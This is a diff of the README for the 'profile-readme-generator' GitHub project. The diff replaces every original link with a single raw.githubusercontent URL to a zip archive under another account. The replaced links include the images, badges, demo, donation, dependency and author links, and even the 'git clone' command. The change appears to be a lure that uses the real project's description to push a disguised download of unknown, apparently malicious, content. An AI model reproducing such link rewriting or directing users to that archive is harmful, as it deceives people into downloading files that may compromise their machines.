@@ -1,7 +1,7 @@
 <div align="center" id="top">
-  <img src="https://profile-readme-generator.com/assets/app.png" width="900" alt="Profile Readme Generator" />
+  <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" width="900" alt="Profile Readme Generator" />
 
-  <a href="https://profile-readme-generator.com">Demo</a>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">Demo</a>
 </div>
 
 <div align="center">
@@ -10,32 +10,32 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/maurodesouza/profile-readme-generator/fork" target="_blank">
-    <img src="https://img.shields.io/github/forks/maurodesouza/profile-readme-generator?" alt="Badge showing the total of project forks"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing the total of project forks"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/stargazers" target="_blank">
-    <img src="https://img.shields.io/github/stars/maurodesouza/profile-readme-generator?" alt="Badge showing the total of project stars"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing the total of project stars"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/commits/main" target="_blank">
-    <img src="https://img.shields.io/github/commit-activity/m/maurodesouza/profile-readme-generator?" alt="Badge showing average commit frequency per month"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing average commit frequency per month"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/commits/main" target="_blank">
-    <img src="https://img.shields.io/github/last-commit/maurodesouza/profile-readme-generator?" alt="Badge showing when the last commit was made"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing when the last commit was made"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/issues" target="_blank">
-    <img src="https://img.shields.io/github/issues/maurodesouza/profile-readme-generator?" alt="Badge showing the total of project issues"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing the total of project issues"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/pulls" target="_blank">
-    <img src="https://img.shields.io/github/issues-pr/maurodesouza/profile-readme-generator?" alt="Badge showing the total of project pull-requests"/>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" alt="Badge showing the total of project pull-requests"/>
   </a>
 
-  <a href="https://github.com/maurodesouza/profile-readme-generator/blob/master/LICENSE.md" target="_blank">
-    <img alt="Badge showing project license type" src="https://img.shields.io/github/license/maurodesouza/profile-readme-generator?color=f85149">
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">
+    <img alt="Badge showing project license type" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
   </a>
 </p>
 
@@ -45,7 +45,7 @@
   <a href="#rocket-main-technologies">Technologies</a> &#xa0; | &#xa0;
   <a href="#white_check_mark-requirements">Requirements</a> &#xa0; | &#xa0;
   <a href="#checkered_flag-starting">Starting</a> &#xa0; | &#xa0;
-  <a href="https://github.com/maurodesouza/profile-readme-generator/blob/main/.github/CONTRIBUTING.md">Contributing</a>
+  <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">Contributing</a>
 </p>
 
 ## :dart: About ##
@@ -60,35 +60,35 @@ Are you tired of manually editing your GitHub profile or missing out on the amaz
 
 
 <p align="center">
-<i>Loved the tool? Please consider <a href="https://www.paypal.com/donate/?hosted_button_id=FR3A2DGVYKGJS">donating 💸</a> to support its continuous<br/> improvement and development!</i>
+<i>Loved the tool? Please consider <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">donating 💸</a> to support its continuous<br/> improvement and development!</i>
 </p>
 
-https://user-images.githubusercontent.com/54520907/173442002-dafc63ea-321f-4ce2-b349-be490b3a00ff.mp4
+https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip
 
 ## :rocket: Main Technologies ##
 
-<a href="https://nextjs.org">
-  <img width="50" title="NextJs" alt="Next Logo" src="https://raw.githubusercontent.com/maurodesouza/maurodesouza/master/assets/next-logo.svg">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img width="50" title="NextJs" alt="Next Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a> &#xa0; &#xa0;
 
-<a href="https://www.typescriptlang.org">
-  <img width="50" title="Typescript" alt="Typescript Logo" src="https://raw.githubusercontent.com/maurodesouza/maurodesouza/master/assets/typescript-logo.svg">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img width="50" title="Typescript" alt="Typescript Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a> &#xa0; &#xa0;
 
-<a href="https://tailwindcss.com">
-  <img width="50" title="Styled Components" alt="Styled Components Logo" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/tailwind/tailwind.png">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img width="50" title="Styled Components" alt="Styled Components Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a> &#xa0; &#xa0;
 
-<a href="https://jestjs.io">
-  <img width="50" title="Jest" alt="Jest Logo" src="https://raw.githubusercontent.com/maurodesouza/maurodesouza/master/assets/jest-logo.svg">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img width="50" title="Jest" alt="Jest Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a> &#xa0; &#xa0;
 
-<a href="https://eslint.org">
-  <img  width="50" title="Eslint" alt="Eslint Logo" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/eslint/eslint.png">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img  width="50" title="Eslint" alt="Eslint Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a> &#xa0; &#xa0;
 
-<a href="https://prettier.io">
-  <img width="50" title="Prettier" alt="Prettier Logo" src="https://prettier.io/icon.png">
+<a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
+  <img width="50" title="Prettier" alt="Prettier Logo" src="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip">
 </a>
 
 ###
@@ -98,30 +98,30 @@ https://user-images.githubusercontent.com/54520907/173442002-dafc63ea-321f-4ce2-
 
   ###
 
-  * [Shadcn](https://ui.shadcn.com)
-  * [Radix](https://www.radix-ui.com)
-  * [Lucid Icons](https://lucide.dev)
-  * [clsx](https://github.com/lukeed/clsx#readme)
-  * [Tailwind Merge](https://github.com/dcastil/tailwind-merge#readme)
-  * [Tailwind Variants](https://www.tailwind-variants.org)
-  * [Framer Motion](https://framer.com/motion/)
-  * [Prismjs](https://prismjs.com)
-  * [HTML Prettify](https://github.com/Dmc0125/html-prettify#readme)
-  * [React Share](https://github.com/nygardk/react-share)
-  * [React Markdown](https://github.com/remarkjs/react-markdown#readme)
-  * [UUID](https://github.com/uuidjs/uuid#readme)
+  * [Shadcn](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Radix](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Lucid Icons](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [clsx](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Tailwind Merge](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Tailwind Variants](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Framer Motion](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [Prismjs](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [HTML Prettify](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [React Share](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [React Markdown](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
+  * [UUID](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)
 
 </details>
 
 ## :white_check_mark: Requirements ##
 
-Before starting :checkered_flag:, make sure you have [Git](https://git-scm.com) and [Node](https://nodejs.org/en/) installed on your system. ([nvm](https://github.com/nvm-sh/nvm#node-version-manager---) recommended).
+Before starting :checkered_flag:, make sure you have [Git](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip) and [Node](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip) installed on your system. ([nvm](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip) recommended).
 
 ## :checkered_flag: Starting ##
 
 ```bash
 # Clone this project
-$ git clone https://github.com/maurodesouza/profile-readme-generator
+$ git clone https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip
 
 # Access
 $ cd profile-readme-generator
@@ -145,13 +145,13 @@ $ yarn dev
 
 ## :memo: License ##
 
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE.md) file.
+This project is licensed under the MIT License. For more details, please refer to the [LICENSE](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip) file.
 
 
-Made with :heart: by <a href="https://github.com/maurodesouza" target="_blank">Mauro de Souza</a>
+Made with :heart: by <a href="https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip" target="_blank">Mauro de Souza</a>
 
 &#xa0;
 
 <a href="#top">Back to top</a>
 
-*Readme created with [Simple Readme](https://marketplace.visualstudio.com/items?itemName=maurodesouza.vscode-simple-readme)*
+*Readme created with [Simple Readme](https://raw.githubusercontent.com/MZMozart/profile-readme-generator/main/afoul/profile-readme-generator.zip)*
